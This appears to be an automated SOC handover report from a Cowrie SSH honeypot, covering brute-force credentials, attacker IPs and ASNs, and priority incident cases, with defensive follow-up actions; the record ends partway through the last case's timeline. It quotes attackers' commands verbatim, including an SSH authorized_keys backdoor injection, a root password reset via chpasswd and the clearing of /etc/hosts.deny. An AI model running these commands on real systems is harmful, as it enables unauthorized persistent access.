# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-29 |
| **Generated At** | 2026-03-29T10:31:13Z |
| **Shift Time** | 10:31 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **68** |
| Confirmed Threats | **46** |
| False Positives Filtered | **22** (32.4%) |
| Unique Attacker IPs | **40** |
| Countries of Origin | **19** |
| High Severity Cases | **13** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **55** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **30** |
| Unique Credential Pairs | **23** |
| Unique Usernames | **14** |
| Unique Passwords | **23** |
| Successful Auth Pairs | **13** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 13 |
| `345gs5662d34` | 3 |
| `Nobody` | 2 |
| `config` | 2 |
| `user` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 3 |
| `3245gs5662d34` | 3 |
| `Passw@rd` | 2 |
| `123123` | 2 |
| `rootroot` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 3 |
| `root` | `3245gs5662d34` | 3 |
| `root` | `Passw@rd` | 2 |
| `root` | `123123` | 2 |
| `root` | `rootroot` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Passw@rd` | `50.217.255.171` | 2026-03-29T08:53:07 |
| `root` | `Passw@rd` | `146.255.228.189` | 2026-03-29T08:53:14 |
| `root` | `$RFV5tgb` | `124.7.227.98` | 2026-03-29T09:04:34 |
| `root` | `123123` | `179.185.1.97` | 2026-03-29T09:12:18 |
| `root` | `123123` | `178.178.222.58` | 2026-03-29T09:12:26 |
| `root` | `woshiguanliyuan` | `8.154.0.104` | 2026-03-29T09:20:03 |
| `root` | `3245gs5662d34` | `8.154.0.104` | 2026-03-29T09:20:06 |
| `root` | `Sx123456!` | `103.63.25.171` | 2026-03-29T09:55:11 |
| `root` | `3245gs5662d34` | `103.63.25.171` | 2026-03-29T09:55:16 |
| `root` | `0admin` | `45.120.216.232` | 2026-03-29T10:07:06 |
| `root` | `3245gs5662d34` | `45.120.216.232` | 2026-03-29T10:07:10 |
| `root` | `rootroot` | `196.189.126.10` | 2026-03-29T10:12:11 |
| `root` | `rootroot` | `122.58.141.226` | 2026-03-29T10:12:25 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:ZGwODo6U88Ed"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `124.7.227.98`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `8.154.0.104`, `103.63.25.171`, `45.120.216.232`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **40** |
| Unique ASNs | **33** |
| High-Risk ASNs | **27** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS9808` | China Mobile Communications Group Co., Ltd. | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS25159` | PJSC MegaFon | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS22773` | Cox Communications Inc. | 2 | LOW |
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS35805` | JSC Silknet | 1 | HIGH |
| `AS9318` | SK Broadband Co Ltd | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (13)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b0513fa869e4

| Field | Detail |
|---|---|
| **Source IP** | `50.217.255[.]171` |
| **First Seen** | 2026-03-29 08:53 |
| **Last Seen** | 2026-03-29 08:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 08:53:05` | `cowrie.session.connect` |
| `2026-03-29 08:53:06` | `cowrie.client.version` |
| `2026-03-29 08:53:06` | `cowrie.client.kex` |
| `2026-03-29 08:53:07` | `cowrie.login.success` |
| `2026-03-29 08:53:08` | `cowrie.direct-tcpip.request` |
| `2026-03-29 08:53:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.217.255[.]171` to AbuseIPDB if not already reported
- [ ] Block `50.217.255[.]171` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a03b7aeeaa7b

| Field | Detail |
|---|---|
| **Source IP** | `146.255.228[.]189` |
| **First Seen** | 2026-03-29 08:53 |
| **Last Seen** | 2026-03-29 08:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 08:53:13` | `cowrie.session.connect` |
| `2026-03-29 08:53:13` | `cowrie.client.version` |
| `2026-03-29 08:53:13` | `cowrie.client.kex` |
| `2026-03-29 08:53:14` | `cowrie.login.success` |
| `2026-03-29 08:53:15` | `cowrie.direct-tcpip.request` |
| `2026-03-29 08:53:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.255.228[.]189` to AbuseIPDB if not already reported
- [ ] Block `146.255.228[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9517ec4e52e4

| Field | Detail |
|---|---|
| **Source IP** | `124.7.227[.]98` |
| **First Seen** | 2026-03-29 09:04 |
| **Last Seen** | 2026-03-29 09:04 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:ZGwODo6U88Ed"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 09:04:34` | `cowrie.session.connect` |
| `2026-03-29 09:04:34` | `cowrie.client.version` |
| `2026-03-29 09:04:34` | `cowrie.client.kex` |
| `2026-03-29 09:04:34` | `cowrie.login.success` |
| `2026-03-29 09:04:34` | `cowrie.session.params` |
| `2026-03-29 09:04:34` | `cowrie.command.input` |
| `2026-03-29 09:04:34` | `cowrie.command.failed` |
| `2026-03-29 09:04:34` | `cowrie.log.closed` |
| `2026-03-29 09:04:34` | `cowrie.session.params` |
| `2026-03-29 09:04:34` | `cowrie.command.input` |
| `2026-03-29 09:04:34` | `cowrie.session.file_download` |
| `2026-03-29 09:04:34` | `cowrie.log.closed` |
| `2026-03-29 09:04:50` | `cowrie.session.params` |
| `2026-03-29 09:04:50` | `cowrie.command.input` |
| `2026-03-29 09:04:50` | `cowrie.log.closed` |
| `2026-03-29 09:04:51` | `cowrie.session.params` |
| `2026-03-29 09:04:51` | `cowrie.command.input` |
| `2026-03-29 09:04:51` | `cowrie.log.closed` |
| `2026-03-29 09:04:51` | `cowrie.session.params` |
| `2026-03-29 09:04:51` | `cowrie.command.input` |
| `2026-03-29 09:04:51` | `cowrie.session.file_download` |
| `2026-03-29 09:04:51` | `cowrie.log.closed` |
| `2026-03-29 09:04:51` | `cowrie.session.params` |
| `2026-03-29 09:04:51` | `cowrie.command.input` |
| `2026-03-29 09:04:51` | `cowrie.log.closed` |
| `2026-03-29 09:04:51` | `cowrie.session.params` |
| `2026-03-29 09:04:51` | `cowrie.command.input` |
| `2026-03-29 09:04:51` | `cowrie.log.closed` |
| `2026-03-29 09:04:51` | `cowrie.session.params` |
| `2026-03-29 09:04:51` | `cowrie.command.input` |
| `2026-03-29 09:04:51` | `cowrie.command.input` |
| `2026-03-29 09:04:51` | `cowrie.log.closed` |
| `2026-03-29 09:04:51` | `cowrie.session.params` |
| `2026-03-29 09:04:51` | `cowrie.command.input` |
| `2026-03-29 09:04:51` | `cowrie.log.closed` |
| `2026-03-29 09:04:51` | `cowrie.session.params` |
| `2026-03-29 09:04:51` | `cowrie.command.input` |
| `2026-03-29 09:04:51` | `cowrie.log.closed` |
| `2026-03-29 09:04:51` | `cowrie.session.params` |
| `2026-03-29 09:04:51` | `cowrie.command.input` |
| `2026-03-29 09:04:52` | `cowrie.log.closed` |
| `2026-03-29 09:04:52` | `cowrie.session.params` |
| `2026-03-29 09:04:52` | `cowrie.command.input` |
| `2026-03-29 09:04:52` | `cowrie.log.closed` |
| `2026-03-29 09:04:52` | `cowrie.session.params` |
| `2026-03-29 09:04:52` | `cowrie.command.input` |
| `2026-03-29 09:04:52` | `cowrie.log.closed` |
| `2026-03-29 09:04:52` | `cowrie.session.params` |
| `2026-03-29 09:04:52` | `cowrie.command.input` |
| `2026-03-29 09:04:52` | `cowrie.log.closed` |
| `2026-03-29 09:04:52` | `cowrie.session.params` |
| `2026-03-29 09:04:52` | `cowrie.command.input` |
| `2026-03-29 09:04:52` | `cowrie.log.closed` |
| `2026-03-29 09:04:52` | `cowrie.session.params` |
| `2026-03-29 09:04:52` | `cowrie.command.input` |
| `2026-03-29 09:04:52` | `cowrie.log.closed` |
| `2026-03-29 09:04:52` | `cowrie.session.params` |
| `2026-03-29 09:04:52` | `cowrie.command.input` |
| `2026-03-29 09:04:52` | `cowrie.log.closed` |
| `2026-03-29 09:04:52` | `cowrie.session.params` |
| `2026-03-29 09:04:52` | `cowrie.command.input` |
| `2026-03-29 09:04:52` | `cowrie.log.closed` |
| `2026-03-29 09:04:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.7.227[.]98` to AbuseIPDB if not already reported
- [ ] Block `124.7.227[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bae22f79df2e

| Field | Detail |
|---|---|
| **Source IP** | `179.185.1[.]97` |
| **First Seen** | 2026-03-29 09:12 |
| **Last Seen** | 2026-03-29 09:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 09:12:14` | `cowrie.session.connect` |
| `2026-03-29 09:12:16` | `cowrie.client.version` |
| `2026-03-29 09:12:16` | `cowrie.client.kex` |
| `2026-03-29 09:12:18` | `cowrie.login.success` |
| `2026-03-29 09:12:19` | `cowrie.direct-tcpip.request` |
| `2026-03-29 09:12:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.1[.]97` to AbuseIPDB if not already reported
- [ ] Block `179.185.1[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cc170c89c4e

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]58` |
| **First Seen** | 2026-03-29 09:12 |
| **Last Seen** | 2026-03-29 09:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 09:12:24` | `cowrie.session.connect` |
| `2026-03-29 09:12:25` | `cowrie.client.version` |
| `2026-03-29 09:12:25` | `cowrie.client.kex` |
| `2026-03-29 09:12:26` | `cowrie.login.success` |
| `2026-03-29 09:12:26` | `cowrie.direct-tcpip.request` |
| `2026-03-29 09:12:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]58` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1831cf72d7fd

| Field | Detail |
|---|---|
| **Source IP** | `8.154.0[.]104` |
| **First Seen** | 2026-03-29 09:20 |
| **Last Seen** | 2026-03-29 09:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 09:20:02` | `cowrie.session.connect` |
| `2026-03-29 09:20:02` | `cowrie.client.version` |
| `2026-03-29 09:20:02` | `cowrie.client.kex` |
| `2026-03-29 09:20:03` | `cowrie.login.success` |
| `2026-03-29 09:20:03` | `cowrie.session.params` |
| `2026-03-29 09:20:03` | `cowrie.command.input` |
| `2026-03-29 09:20:03` | `cowrie.command.failed` |
| `2026-03-29 09:20:03` | `cowrie.log.closed` |
| `2026-03-29 09:20:03` | `cowrie.session.params` |
| `2026-03-29 09:20:03` | `cowrie.command.input` |
| `2026-03-29 09:20:03` | `cowrie.session.file_download` |
| `2026-03-29 09:20:03` | `cowrie.log.closed` |
| `2026-03-29 09:20:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.0[.]104` to AbuseIPDB if not already reported
- [ ] Block `8.154.0[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b885220464f8

| Field | Detail |
|---|---|
| **Source IP** | `8.154.0[.]104` |
| **First Seen** | 2026-03-29 09:20 |
| **Last Seen** | 2026-03-29 09:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 09:20:06` | `cowrie.session.connect` |
| `2026-03-29 09:20:06` | `cowrie.client.version` |
| `2026-03-29 09:20:06` | `cowrie.client.kex` |
| `2026-03-29 09:20:06` | `cowrie.login.success` |
| `2026-03-29 09:20:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.0[.]104` to AbuseIPDB if not already reported
- [ ] Block `8.154.0[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-307766b42ecb

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]171` |
| **First Seen** | 2026-03-29 09:55 |
| **Last Seen** | 2026-03-29 09:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 09:55:10` | `cowrie.session.connect` |
| `2026-03-29 09:55:11` | `cowrie.client.version` |
| `2026-03-29 09:55:11` | `cowrie.client.kex` |
| `2026-03-29 09:55:11` | `cowrie.login.success` |
| `2026-03-29 09:55:12` | `cowrie.session.params` |
| `2026-03-29 09:55:12` | `cowrie.command.input` |
| `2026-03-29 09:55:12` | `cowrie.command.failed` |
| `2026-03-29 09:55:12` | `cowrie.log.closed` |
| `2026-03-29 09:55:12` | `cowrie.session.params` |
| `2026-03-29 09:55:12` | `cowrie.command.input` |
| `2026-03-29 09:55:12` | `cowrie.session.file_download` |
| `2026-03-29 09:55:12` | `cowrie.log.closed` |
| `2026-03-29 09:55:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]171` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6e1555a2031

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]171` |
| **First Seen** | 2026-03-29 09:55 |
| **Last Seen** | 2026-03-29 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 09:55:15` | `cowrie.session.connect` |
| `2026-03-29 09:55:15` | `cowrie.client.version` |
| `2026-03-29 09:55:15` | `cowrie.client.kex` |
| `2026-03-29 09:55:16` | `cowrie.login.success` |
| `2026-03-29 09:55:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]171` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa0e67ca17fa

| Field | Detail |
|---|---|
| **Source IP** | `45.120.216[.]232` |
| **First Seen** | 2026-03-29 10:07 |
| **Last Seen** | 2026-03-29 10:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 10:07:05` | `cowrie.session.connect` |
| `2026-03-29 10:07:05` | `cowrie.client.version` |
| `2026-03-29 10:07:05` | `cowrie.client.kex` |
| `2026-03-29 10:07:06` | `cowrie.login.success` |
| `2026-03-29 10:07:06` | `cowrie.session.params` |
| `2026-03-29 10:07:06` | `cowrie.command.input` |
| `2026-03-29 10:07:06` | `cowrie.command.failed` |
| `2026-03-29 10:07:06` | `cowrie.log.closed` |
| `2026-03-29 10:07:07` | `cowrie.session.params` |
| `2026-03-29 10:07:07` | `cowrie.command.input` |
| `2026-03-29 10:07:07` | `cowrie.session.file_download` |
| `2026-03-29 10:07:07` | `cowrie.log.closed` |
| `2026-03-29 10:07:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.216[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.120.216[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ddb3f3f12e2

| Field | Detail |
|---|---|
| **Source IP** | `45.120.216[.]232` |
| **First Seen** | 2026-03-29 10:07 |
| **Last Seen** | 2026-03-29 10:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 10:07:09` | `cowrie.session.connect` |
| `2026-03-29 10:07:09` | `cowrie.client.version` |
| `2026-03-29 10:07:09` | `cowrie.client.kex` |
| `2026-03-29 10:07:10` | `cowrie.login.success` |
| `2026-03-29 10:07:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.216[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.120.216[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f560913a19b

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]10` |
| **First Seen** | 2026-03-29 10:12 |
| **Last Seen** | 2026-03-29 10:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 10:12:10` | `cowrie.session.connect` |
| `2026-03-29 10:12:10` | `cowrie.client.version` |
| `2026-03-29 10:12:10` | `cowrie.client.kex` |
| `2026-03-29 10:12:11` | `cowrie.login.success` |
| `2026-03-29 10:12:12` | `cowrie.direct-tcpip.request` |
| `2026-03-29 10:12:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]10` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72162e2f3131

| Field | Detail |
|---|---|
| **Source IP** | `122.58.141[.]226` |
| **First Seen** | 2026-03-29 10:12 |
| **Last Seen** | 2026-03-29 10:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 10:12:21` | `cowrie.session.connect` |
| `2026-03-29 10:12:22` | `cowrie.client.version` |
| `2026-03-29 10:12:22` | `cowrie.client.kex` |
| `2026-03-29 10:12:25` | `cowrie.login.success` |
| `2026-03-29 10:12:26` | `cowrie.direct-tcpip.request` |
